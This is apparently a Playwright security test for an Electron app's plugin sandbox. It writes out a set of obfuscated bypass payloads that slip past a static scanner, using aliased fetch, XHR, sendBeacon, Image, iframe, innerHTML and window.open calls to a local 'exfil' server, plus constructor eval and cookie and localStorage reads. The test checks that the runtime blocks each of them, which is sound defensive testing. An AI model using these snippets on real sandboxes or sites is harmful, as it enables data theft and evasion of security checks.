'use strict';

const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const { test, expect, _electron: electron } = require('@playwright/test');
const { scanPageScript } = require('../src/main/plugins/security');

/**
 * octo.page.run в живом Electron: обходы, которые статическая проверка не
 * видит (алиасы fetch, constructor.constructor, new Image, document через
 * переменную), останавливает сам изолированный мир — его CSP и замки.
 *
 * Страница специально отдаёт максимально мягкую CSP, а «чужой сервер» слушает
 * другой порт: любой запрос, дошедший до него, — утечка.
 */

async function waitForWindow(app, predicate, label) {
  for (let attempt = 0; attempt < 80; attempt += 1) {
    const found = app.windows().find(predicate);
    if (found) return found;
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  throw new Error(`окно не появилось: ${label}`);
}

const PLUGIN = {
  id: 'app.octo.pageworld',
  name: 'Page world test',
  version: '1.0.0',
  apiVersion: 1,
  minAppVersion: '0.5.0',
  description: 'Проверка изоляции page.run',
  author: { name: 'octo' },
  license: 'MIT',
  main: 'index.js',
  permissions: ['page:script'],
};

const SOURCE = `'use strict';
octo.onActivate(async () => {
  await octo.commands.add({
    id: 'probe',
    title: 'Probe page.run',
    run: async (spec) => {
      let body;
      try {
        body = 'ok:' + JSON.stringify(await octo.page.run(spec.code));
      } catch (error) {
        body = 'err:' + error.message;
      }
      // Результат — в атрибут страницы (base64, чтобы слова из текста ошибки
      // не задели сканер): тест читает его из главного мира.
      const encoded = btoa(unescape(encodeURIComponent(body)));
      await octo.page.run(
        'document.documentElement.setAttribute(' +
          JSON.stringify('data-probe-' + spec.name) + ', ' + JSON.stringify(encoded) + '); return true;',
      );
    },
  });
});
`;

test('page.run: CSP мира и замки останавливают обходы проверки', async () => {
  test.setTimeout(90_000);
  const userData = fs.mkdtempSync(path.join(os.tmpdir(), 'octo-page-world-'));
  const devDir = path.join(userData, 'dev-plugins');
  const pluginDir = path.join(devDir, 'page-world');
  fs.mkdirSync(pluginDir, { recursive: true });
  fs.writeFileSync(path.join(pluginDir, 'plugin.json'), JSON.stringify(PLUGIN, null, 2));
  fs.writeFileSync(path.join(pluginDir, 'index.js'), SOURCE);

  const hits = [];
  const exfil = http.createServer((request, response) => {
    hits.push(request.url);
    response.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'image/gif' });
    response.end('x');
  });
  const site = http.createServer((_request, response) => {
    response.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'content-security-policy': "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
      'set-cookie': 'octo_test=secret; Path=/',
      connection: 'close',
    });
    response.end(
      '<!doctype html><html><head><title>Изоляция — octo</title></head><body><p>hi</p></body></html>',
    );
  });
  await new Promise((resolve) => exfil.listen(0, '127.0.0.1', resolve));
  await new Promise((resolve) => site.listen(0, '127.0.0.1', resolve));
  const external = `http://localhost:${exfil.address().port}`;
  const home = `http://127.0.0.1:${site.address().port}/@octo/video/1`;

  // Всё это проходит статическую проверку — ловить должен рантайм.
  const U = `const U = ${JSON.stringify(external)};`;
  const bypasses = {
    fetchAlias: `${U} const f = window.fetch; return f(U + '/fetch').then(() => 'sent', () => 'blocked');`,
    xhrAlias: `${U} const X = window['XMLHttp' + 'Request']; const x = new X(); x.open('GET', U + '/xhr'); x.send(); return 'sent';`,
    beacon: `${U} const n = navigator; return n['send' + 'Beacon'](U + '/beacon', 'a');`,
    image: `${U} const i = new Image(); i.src = U + '/image'; return 'set';`,
    ctorCtor: `return [].constructor.constructor('return 40 + 2')();`,
    cookie: `const d = document; return d.cookie;`,
    storage: `const w = window; return w['local' + 'Storage'].length;`,
    iframe: `${U} const d = document; const f = d['create' + 'Element']('iframe'); f.src = U + '/iframe'; d.body.append(f); return 'set';`,
    html: `${U} const k = 'inner' + 'HTML'; document.body[k] = '<iframe src="' + U + '/html"></iframe>'; return 'set';`,
    open: `${U} const w = window; w['op' + 'en'](U + '/open'); return 'set';`,
  };
  for (const [name, code] of Object.entries(bypasses)) {
    expect(scanPageScript(code).ok, `${name} должен проходить сканер`).toBe(true);
  }

  let app;
  try {
    app = await electron.launch({
      args: [path.join(__dirname, '..'), '--no-sandbox'],
      env: {
        ...process.env,
        OCTO_E2E: '1',
        OCTO_USER_DATA: userData,
        OCTO_HOME_URL: home,
        OCTO_PLUGIN_DEV_DIR: devDir,
      },
    });
    await app.firstWindow();
    const page = await waitForWindow(
      app,
      (candidate) => candidate.url().startsWith('file://'),
      'полоса заголовка',
    );
    const sitePage = await waitForWindow(app, (candidate) => candidate.url() === home, 'сайт');
    await expect.poll(() => sitePage.evaluate(() => document.readyState === 'complete')).toBe(true);
    await waitForWindow(
      app,
      (candidate) => candidate.url().startsWith(`octo-plugin://${PLUGIN.id}/`),
      'хост плагина',
    );

    const probe = async (name, code) => {
      const attr = `data-probe-${name.toLowerCase()}`;
      await expect
        .poll(
          async () => {
            await page.evaluate(
              (spec) => window.octo.cmd('plugin:app.octo.pageworld:probe', spec),
              { name: name.toLowerCase(), code },
            );
            return sitePage.evaluate((key) => document.documentElement.hasAttribute(key), attr);
          },
          { timeout: 15_000 },
        )
        .toBe(true);
      const encoded = await sitePage.evaluate(
        (key) => document.documentElement.getAttribute(key),
        attr,
      );
      return Buffer.from(encoded, 'base64').toString('utf8');
    };

    // Обычный скрипт работает как раньше: читает и меняет DOM.
    expect(
      await probe(
        'normal',
        `document.documentElement.setAttribute('data-octo-world', '1'); return document.title;`,
      ),
    ).toBe('ok:"Изоляция — octo"');
    await expect
      .poll(() => sitePage.evaluate(() => document.documentElement.dataset.octoWorld))
      .toBe('1');

    const results = {};
    for (const [name, code] of Object.entries(bypasses)) {
      results[name] = await probe(name, code);
    }
    expect(results.fetchAlias).toBe('ok:"blocked"');
    expect(results.ctorCtor).toMatch(/^err:.*unsafe-eval/);
    expect(results.cookie).toBe('ok:""');
    expect(results.storage).toMatch(/^err:.*localStorage/);
    expect(results.iframe).toMatch(/^err:.*iframe/);
    expect(results.html).toMatch(/^err:.*HTML/);
    expect(results.open).toMatch(/^err:.*window\.open/);

    // Сайт своего не теряет: cookie и fetch главного мира на месте.
    expect(await sitePage.evaluate(() => document.cookie)).toContain('octo_test=secret');
    expect(await sitePage.evaluate(() => typeof window.fetch)).toBe('function');

    // Ни один запрос не дошёл до «чужого» сервера.
    await new Promise((resolve) => setTimeout(resolve, 1500));
    expect(hits).toEqual([]);

    // Новый документ — новый мир: защита ставится заново, скрипт работает.
    await sitePage.reload();
    await expect
      .poll(() => sitePage.evaluate(() => document.documentElement.dataset.octoWorld ?? null))
      .toBeNull();
    expect(await probe('afterReload', bypasses.fetchAlias)).toBe('ok:"blocked"');
    expect(await probe('evalAfterReload', bypasses.ctorCtor)).toMatch(/^err:.*unsafe-eval/);
    expect(await probe('normalAfterReload', 'return document.title;')).toBe('ok:"Изоляция — octo"');
    await new Promise((resolve) => setTimeout(resolve, 1000));
    expect(hits).toEqual([]);
  } finally {
    if (app) await app.close();
    exfil.close();
    site.closeAllConnections?.();
    site.close();
    fs.rmSync(userData, { recursive: true, force: true });
  }
});
